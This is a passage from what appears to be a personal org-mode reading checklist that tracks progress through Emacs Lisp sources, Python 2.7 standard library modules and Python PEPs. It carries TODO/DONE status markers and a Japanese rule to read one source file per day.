**** TODO file:/root/work/emacs23-23.1+1/lisp/language/japanese.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/language/utf-8-lang.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/indent.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/window.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/frame.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/tty-colors.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/font-core.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/facemenu.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/syntax.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/font-lock.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/jit-lock.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/mouse.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/scroll-bar.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/select.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/timer.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/isearch.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/rfn-eshadow.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/menu-bar.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/paths.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/lisp.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/textmodes/page.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/register.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/textmodes/paragraphs.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/lisp-mode.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/textmodes/text-mode.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/textmodes/fill.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/replace.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/buff-menu.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/fringe.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/image.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/international/fontset.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/dnd.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/mwheel.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/tool-bar.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/x-dnd.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/common-win.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/x-win.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/w32-vars.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/common-win.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/w32-win.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/ls-lisp.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/disp-table.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/dos-w32.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/w32-fns.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/dos-w32.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/dos-fns.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/dos-vars.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/pc-win.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/ls-lisp.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/disp-table.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/ls-lisp.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/easymenu.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/term/ns-win.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/emacs-lisp/float-sup.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/vc-hooks.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/ediff-hook.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/tooltip.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/site-load.el
**** TODO file:/root/work/emacs23-23.1+1/lisp/site-init.el
*** python [22/224]
   - Rule
# 一日 1 file source を読む
# source を読み改善できるところは改善する
	 222 file
**** TODO argparse.py
**** TODO file:/usr/lib/python2.7/_abcoll.py
**** TODO file:/usr/lib/python2.7/abc.py
**** TODO file:/usr/lib/python2.7/aifc.py
**** TODO file:/usr/lib/python2.7/anydbm.py
**** TODO file:/usr/lib/python2.7/ast.py
**** TODO file:/usr/lib/python2.7/asynchat.py
**** TODO file:/usr/lib/python2.7/asyncore.py
**** TODO file:/usr/lib/python2.7/atexit.py
**** TODO file:/usr/lib/python2.7/audiodev.py
**** TODO file:/usr/lib/python2.7/base64.py
**** TODO file:/usr/lib/python2.7/BaseHTTPServer.py
**** TODO file:/usr/lib/python2.7/Bastion.py
**** TODO file:/usr/lib/python2.7/bdb.py
**** TODO file:/usr/lib/python2.7/binhex.py
**** DONE file:/usr/lib/python2.7/bisect.py
     CLOSED: [2013-01-22  21:31]
**** TODO file:/usr/lib/python2.7/bsddb
**** TODO file:/usr/lib/python2.7/build
**** TODO file:/usr/lib/python2.7/calendar.py
**** TODO file:/usr/lib/python2.7/CGIHTTPServer.py
**** TODO file:/usr/lib/python2.7/cgi.py
**** TODO file:/usr/lib/python2.7/cgitb.py
**** TODO file:/usr/lib/python2.7/chunk.py
**** TODO file:/usr/lib/python2.7/cmd.py
**** TODO file:/usr/lib/python2.7/codecs.py
**** TODO file:/usr/lib/python2.7/codeop.py
**** TODO file:/usr/lib/python2.7/code.py
**** TODO file:/usr/lib/python2.7/collections.py
**** TODO file:/usr/lib/python2.7/colorsys.py
**** TODO file:/usr/lib/python2.7/commands.py
**** TODO file:/usr/lib/python2.7/compileall.py
**** TODO file:/usr/lib/python2.7/compiler
**** TODO file:/usr/lib/python2.7/config
**** TODO file:/usr/lib/python2.7/ConfigParser.py
**** DONE file:/usr/lib/python2.7/contextlib.py
     CLOSED: [2013-01-27  00:25]
**** TODO file:/usr/lib/python2.7/cookielib.py
**** TODO file:/usr/lib/python2.7/Cookie.py
**** TODO file:/usr/lib/python2.7/copy.py
**** TODO file:/usr/lib/python2.7/copy_reg.py
**** TODO file:/usr/lib/python2.7/cProfile.py
**** TODO file:/usr/lib/python2.7/csv.py
**** TODO file:/usr/lib/python2.7/ctypes
**** TODO file:/usr/lib/python2.7/curses
**** TODO file:/usr/lib/python2.7/dbhash.py
**** TODO file:/usr/lib/python2.7/decimal.py
**** TODO file:/usr/lib/python2.7/difflib.py
**** DONE file:/usr/lib/python2.7/dircache.py
**** TODO file:/usr/lib/python2.7/dis.py
**** TODO file:/usr/lib/python2.7/dist-packages
**** TODO file:/usr/lib/python2.7/distutils
**** TODO file:/usr/lib/python2.7/doctest.py
**** TODO file:/usr/lib/python2.7/DocXMLRPCServer.py
**** TODO file:/usr/lib/python2.7/dumbdbm.py
**** TODO file:/usr/lib/python2.7/dummy_threading.py
**** TODO file:/usr/lib/python2.7/dummy_thread.py
**** TODO file:/usr/lib/python2.7/email
**** TODO file:/usr/lib/python2.7/encodings
**** DONE file:/usr/lib/python2.7/filecmp.py
**** TODO file:/usr/lib/python2.7/fileinput.py
**** DONE file:/usr/lib/python2.7/fnmatch.py
     CLOSED: [2013-01-18 18:01]
**** TODO file:/usr/lib/python2.7/formatter.py
**** TODO file:/usr/lib/python2.7/fpformat.py
**** TODO file:/usr/lib/python2.7/fractions.py
**** TODO file:/usr/lib/python2.7/ftplib.py
**** DONE file:/usr/lib/python2.7/functools.py
**** TODO file:/usr/lib/python2.7/__future__.py
**** DONE file:/usr/lib/python2.7/genericpath.py
**** TODO file:/usr/lib/python2.7/getopt.py
**** TODO file:/usr/lib/python2.7/getpass.py
**** TODO file:/usr/lib/python2.7/gettext.py
**** DONE file:/usr/lib/python2.7/glob.py
**** TODO file:/usr/lib/python2.7/gzip.py
**** TODO file:/usr/lib/python2.7/hashlib.py
**** TODO file:/usr/lib/python2.7/heapq.py
**** TODO file:/usr/lib/python2.7/hmac.py
**** TODO file:/usr/lib/python2.7/hotshot
**** TODO file:/usr/lib/python2.7/htmlentitydefs.py
**** TODO file:/usr/lib/python2.7/htmllib.py
**** TODO file:/usr/lib/python2.7/HTMLParser.py
**** TODO file:/usr/lib/python2.7/httplib.py
**** TODO file:/usr/lib/python2.7/ihooks.py
**** TODO file:/usr/lib/python2.7/imaplib.py
**** TODO file:/usr/lib/python2.7/imghdr.py
**** TODO file:/usr/lib/python2.7/imputil.py
**** TODO file:/usr/lib/python2.7/inspect.py
**** TODO file:/usr/lib/python2.7/io.py
**** TODO file:/usr/lib/python2.7/json
**** TODO file:/usr/lib/python2.7/keyword.py
**** TODO file:/usr/lib/python2.7/lib2to3
**** TODO file:/usr/lib/python2.7/lib-dynload
**** TODO file:/usr/lib/python2.7/lib-tk
**** TODO file:/usr/lib/python2.7/linecache.py
**** TODO file:/usr/lib/python2.7/locale.py
**** TODO file:/usr/lib/python2.7/logging
**** TODO file:/usr/lib/python2.7/_LWPCookieJar.py
**** TODO file:/usr/lib/python2.7/macpath.py
**** TODO file:/usr/lib/python2.7/macurl2path.py
**** TODO file:/usr/lib/python2.7/mailbox.py
**** TODO file:/usr/lib/python2.7/mailcap.py
**** TODO file:/usr/lib/python2.7/markupbase.py
**** TODO file:/usr/lib/python2.7/md5.py
**** TODO file:/usr/lib/python2.7/mhlib.py
**** TODO file:/usr/lib/python2.7/mimetools.py
**** TODO file:/usr/lib/python2.7/mimetypes.py
**** TODO file:/usr/lib/python2.7/MimeWriter.py
**** TODO file:/usr/lib/python2.7/mimify.py
**** TODO file:/usr/lib/python2.7/modulefinder.py
**** TODO file:/usr/lib/python2.7/_MozillaCookieJar.py
**** TODO file:/usr/lib/python2.7/multifile.py
**** TODO file:/usr/lib/python2.7/multiprocessing
**** TODO file:/usr/lib/python2.7/mutex.py
**** TODO file:/usr/lib/python2.7/netrc.py
**** TODO file:/usr/lib/python2.7/new.py
**** TODO file:/usr/lib/python2.7/nntplib.py
**** DONE file:/usr/lib/python2.7/ntpath.py
**** TODO file:/usr/lib/python2.7/nturl2path.py
**** TODO file:/usr/lib/python2.7/numbers.py
**** TODO file:/usr/lib/python2.7/opcode.py
**** TODO file:/usr/lib/python2.7/optparse.py
**** TODO file:/usr/lib/python2.7/os2emxpath.py
**** DONE file:/usr/lib/python2.7/os.py
**** TODO file:/usr/lib/python2.7/pdb.py
**** TODO file:/usr/lib/python2.7/__phello__.foo.py
**** TODO file:/usr/lib/python2.7/pickle.py
**** TODO file:/usr/lib/python2.7/pickletools.py
**** TODO file:/usr/lib/python2.7/pipes.py
**** TODO file:/usr/lib/python2.7/pkgutil.py
**** TODO file:/usr/lib/python2.7/platform.py
**** TODO file:/usr/lib/python2.7/plat-linux2
**** TODO file:/usr/lib/python2.7/plistlib.py
**** TODO file:/usr/lib/python2.7/popen2.py
**** TODO file:/usr/lib/python2.7/poplib.py
**** TODO file:/usr/lib/python2.7/posixfile.py
**** TODO file:/usr/lib/python2.7/posixpath.py
**** TODO file:/usr/lib/python2.7/pprint.py
**** TODO file:/usr/lib/python2.7/pty.py
**** TODO file:/usr/lib/python2.7/pyclbr.py
**** TODO file:/usr/lib/python2.7/py_compile.py
**** POSTPONES file:/usr/lib/python2.7/pydoc.py
**** TODO file:/usr/lib/python2.7/pydoc_topics.py
**** DONE file:/usr/lib/python2.7/Queue.py
     CLOSED: [2013-01-23  00:04]
**** TODO file:/usr/lib/python2.7/quopri.py
**** DONE file:/usr/lib/python2.7/random.py
**** TODO file:/usr/lib/python2.7/repr.py
**** DONE file:/usr/lib/python2.7/re.py
     CLOSED: [2012-12-29 Sat 21:34]
**** TODO file:/usr/lib/python2.7/rexec.py
**** TODO file:/usr/lib/python2.7/rfc822.py
**** TODO file:/usr/lib/python2.7/rlcompleter.py
**** TODO file:/usr/lib/python2.7/robotparser.py
**** TODO file:/usr/lib/python2.7/runpy.py
**** TODO file:/usr/lib/python2.7/sched.py
**** TODO file:/usr/lib/python2.7/sets.py
**** TODO file:/usr/lib/python2.7/sgmllib.py
**** TODO file:/usr/lib/python2.7/sha.py
**** TODO file:/usr/lib/python2.7/shelve.py
**** TODO file:/usr/lib/python2.7/shlex.py
**** DONE file:/usr/lib/python2.7/shutil.py
     CLOSED: [2013-01-18 17:31]
**** TODO file:/usr/lib/python2.7/SimpleHTTPServer.py
**** TODO file:/usr/lib/python2.7/SimpleXMLRPCServer.py
**** TODO file:/usr/lib/python2.7/sitecustomize.py -> /etc/python2.6/si
**** TODO file:/usr/lib/python2.7/site-packages
**** TODO file:/usr/lib/python2.7/site.py
**** TODO file:/usr/lib/python2.7/smtpd.py
**** TODO file:/usr/lib/python2.7/smtplib.py
**** TODO file:/usr/lib/python2.7/sndhdr.py
**** TODO file:/usr/lib/python2.7/socket.py
**** TODO file:/usr/lib/python2.7/SocketServer.py
**** TODO file:/usr/lib/python2.7/sqlite3
**** TODO file:/usr/lib/python2.7/sre_compile.py
**** TODO file:/usr/lib/python2.7/sre_constants.py
**** TODO file:/usr/lib/python2.7/sre_parse.py
**** TODO file:/usr/lib/python2.7/sre.py
**** TODO file:/usr/lib/python2.7/ssl.py
**** TODO file:/usr/lib/python2.7/stat.py
**** TODO file:/usr/lib/python2.7/statvfs.py
**** TODO file:/usr/lib/python2.7/StringIO.py
**** TODO file:/usr/lib/python2.7/stringold.py
**** TODO file:/usr/lib/python2.7/stringprep.py
**** DONE file:/usr/lib/python2.7/string.py
     CLOSED: [2013-01-21 03:24]
**** TODO file:/usr/lib/python2.7/_strptime.py
**** TODO file:/usr/lib/python2.7/struct.py
**** DONE file:/usr/lib/python2.7/subprocess.py
**** TODO file:/usr/lib/python2.7/sunaudio.py
**** TODO file:/usr/lib/python2.7/sunau.py
**** TODO file:/usr/lib/python2.7/symbol.py
**** TODO file:/usr/lib/python2.7/symtable.py
**** TODO file:/usr/lib/python2.7/tabnanny.py
**** TODO file:/usr/lib/python2.7/tarfile.py
**** TODO file:/usr/lib/python2.7/telnetlib.py
**** DONE file:/usr/lib/python2.7/tempfile.py
**** TODO file:/usr/lib/python2.7/test
**** DONE file:/usr/lib/python2.7/textwrap.py
     CLOSED: [2013-01-21  21:28]
**** DONE file:/usr/lib/python2.7/this.py
**** TODO file:/usr/lib/python2.7/_threading_local.py
**** TODO file:/usr/lib/python2.7/threading.py
**** TODO file:/usr/lib/python2.7/timeit.py
**** TODO file:/usr/lib/python2.7/toaiff.py
**** TODO file:/usr/lib/python2.7/tokenize.py
**** TODO file:/usr/lib/python2.7/token.py
**** TODO file:/usr/lib/python2.7/traceback.py
**** TODO file:/usr/lib/python2.7/trace.py
**** TODO file:/usr/lib/python2.7/tty.py
**** DONE file:/usr/lib/python2.7/types.py
**** TODO file:/usr/lib/python2.7/unittest.py
**** TODO file:/usr/lib/python2.7/urllib2.py
**** TODO file:/usr/lib/python2.7/urllib.py
**** DONE file:/usr/lib/python2.7/urlparse.py
2012/10/30
**** TODO file:/usr/lib/python2.7/UserDict.py
**** TODO file:/usr/lib/python2.7/UserList.py
**** DONE file:/usr/lib/python2.7/user.py
**** TODO file:/usr/lib/python2.7/UserString.py
**** TODO file:/usr/lib/python2.7/uuid.py
**** TODO file:/usr/lib/python2.7/uu.py
**** TODO file:/usr/lib/python2.7/warnings.py
**** TODO file:/usr/lib/python2.7/wave.py
**** TODO file:/usr/lib/python2.7/weakref.py
**** TODO file:/usr/lib/python2.7/webbrowser.py
**** TODO file:/usr/lib/python2.7/whichdb.py
**** TODO file:/usr/lib/python2.7/wsgiref
**** TODO file:/usr/lib/python2.7/xdrlib.py
**** TODO file:/usr/lib/python2.7/xml
**** TODO file:/usr/lib/python2.7/xmllib.py
**** TODO file:/usr/lib/python2.7/xmlrpclib.py
**** TODO file:/usr/lib/python2.7/zipfile.py
*** python pep [5/321]
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0000.txt
**** DONE p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0001.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0002.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0003.txt
**** DONE p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0004.txt
**** DONE p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0005.txt
**** DONE p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0006.txt
**** POSTPONES p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0007.txt
**** DONE p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0008.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0009.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0010.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0011.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0012.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0020.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0042.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0100.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0101.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0102.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0160.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0200.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0201.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0202.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0203.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0204.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0205.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0206.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0207.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0208.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0209.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0210.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0211.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0212.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0213.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0214.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0215.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0216.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0217.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0218.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0219.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0220.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0221.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0222.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0223.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0224.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0225.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0226.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0227.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0228.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0229.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0230.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0231.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0232.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0233.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0234.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0235.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0236.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0237.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0238.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0239.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0240.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0241.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0242.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0243.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0244.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0245.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0246.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0247.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0248.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0249.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0250.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0251.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0252.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0253.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0254.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0255.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0256.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0257.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0258.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0259.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0260.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0261.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0262.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0263.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0264.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0265.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0266.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0267.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0268.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0269.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0270.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0271.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0272.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0273.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0274.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0275.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0276.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0277.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0278.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0279.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0280.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0281.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0282.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0283.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0284.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0285.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0286.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0287.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0288.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0289.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0290.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0291.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0292.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0293.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0294.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0295.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0296.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0297.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0298.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0299.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0301.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0302.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0303.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0304.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0305.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0306.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0307.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0308.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0309.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0310.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0311.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0312.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0313.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0314.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0315.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0316.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0317.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0318.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0319.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0320.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0321.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0322.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0323.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0324.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0325.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0326.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0327.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0328.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0329.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0330.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0331.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0332.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0333.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0334.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0335.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0336.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0337.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0338.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0339.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0340.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0341.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0342.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0343.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0344.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0345.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0346.txt
**** TODO p:/Office/emacs/.emacs.d/data_e/code/python/pep/pep-0347.txt
